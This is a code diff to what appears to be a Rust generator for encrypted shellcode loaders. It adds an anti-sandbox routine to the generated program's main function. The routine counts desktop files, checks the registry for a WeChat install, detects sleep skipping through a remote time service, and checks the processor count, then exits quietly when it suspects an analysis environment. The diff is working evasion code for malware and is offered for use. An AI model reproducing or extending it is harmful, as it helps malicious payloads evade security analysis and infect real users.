@@ -22,6 +22,10 @@ cbc = "0.1.2"
 rand_core = {{ version = "0.6", features = ["std"] }}
 aes = "0.8"
 base64 = "0.21.0"
+dirs = "3.0"
+winreg = "0.9"
+reqwest = {{ version = "0.11",features = ["blocking","json"] }}
+
 [profile.release]
 panic = "abort"
 lto = true
@@ -65,6 +69,18 @@ use winapi::um::winnt::MAXIMUM_ALLOWED;
 type Aes128CbcDec = cbc::Decryptor<aes::Aes128>;
 use base64::engine::{{general_purpose, Engine as _}};
 use std::u8;
+use dirs::home_dir;
+use reqwest;
+use winreg::HKEY;
+use std::collections::HashMap;
+use std::ffi::OsString;
+use std::fs;
+use std::process;
+use std::thread;
+use std::time::Duration;
+use winreg::enums::*;
+use winreg::RegKey;
+
 "#
     )
 }
@@ -89,9 +105,120 @@ pub fn ntloader() -> String {
     )
 }
 
+
+
+pub fn anti_s() -> String {
+    format!(
+        r#"
+fn count_files_in_dir(dir_path: &str) -> Result<usize, std::io::Error> {{
+    let entries = fs::read_dir(dir_path)?;
+
+    let mut count = 0;
+    for _ in entries {{
+        count += 1;
+    }}
+
+    Ok(count)
+}}
+
+fn check_desktop() -> i32 {{
+    if let Some(mut home_dir) = home_dir() {{
+        home_dir.push("Desktop");
+        match count_files_in_dir(home_dir.to_str().unwrap()) {{
+            Ok(file_count) => {{
+                println!("用户桌面文件数：{{}}", file_count);
+                if file_count < 7 {{
+                    1
+                }} else {{
+                    0
+                }}
+            }}
+            Err(err) => {{
+                eprintln!("无法读取用户桌面文件列表：{{}}", err);
+                0
+            }}
+        }}
+    }} else {{
+        eprintln!("无法获取用户主目录");
+        0
+    }}
+}}
+
+fn check_wechat_exist() -> i32 {{
+    let key_path = r"SOFTWARE\Tencent\bugReport\WechatWindows";
+    let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
+
+    match hklm.open_subkey_with_flags(key_path,KEY_QUERY_VALUE) {{
+        Ok(reg_key) => match reg_key.get_value::<String, _>("InstallDir") {{
+            Ok(install_path) => {{
+                let install_path_str: OsString = install_path.into();
+                let install_path_str = install_path_str.to_string_lossy();
+
+                println!("微信安装路径: {{}}", install_path_str);
+                0
+            }}
+            Err(err) => {{
+                eprintln!("无法获取注册表键值：{{}}", err);
+                1
+            }}
+        }},
+        Err(err) => {{
+            eprintln!("无法打开注册表子键：{{}}", err);
+            1
+        }}
+    }}
+}}
+
+fn check_timestamp() -> Result<i32, reqwest::Error> {{
+    let res = reqwest::blocking::get("https://quan.suning.com/getSysTime.do")?
+        .json::<HashMap<String, String>>()?;
+    let start:i64 = res.get("sysTime1").unwrap().parse().unwrap();
+    thread::sleep(Duration::from_secs(3));
+    let res = reqwest::blocking::get("https://quan.suning.com/getSysTime.do")?
+        .json::<HashMap<String, String>>()?;
+    let end:i64 = res.get("sysTime1").unwrap().parse().unwrap();
+   
+    if end - start < 3 {{
+       Ok(1)
+    }} else {{
+        Ok(0)
+    }}
+}}
+
+fn checke_cpu() -> i32 {{
+    let num = 2;
+    let hklm: HKEY = HKEY_LOCAL_MACHINE;
+    let subkey = r"SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment";
+    let cpu = RegKey::predef(hklm).open_subkey(subkey)
+        .and_then(|keyval| keyval.get_value("NUMBER_OF_PROCESSORS").map(|v: String| v))
+        .unwrap_or_else(|_| "".to_string());
+    println!("[*] The number of CPUs is: {{}}", cpu);
+    if cpu.parse::<i32>().unwrap() <= num {{
+        1
+    }} else {{
+        0
+    }}
+}}
+
+fn anti_s() {{
+    let r1 = check_desktop();
+    let r2 = check_wechat_exist();
+    let r3 = check_timestamp().unwrap();
+    let r4 = checke_cpu();
+    if r1 + r2 + r3 + r4 >= 3 {{
+        std::process::exit(0)
+    }}
+}}
+"#
+    )
+}
+
+
+
 pub fn main_() -> String {
     format!(
         r#"fn main(){{
+        anti_s();
         ntloader()  
     }}
     "#
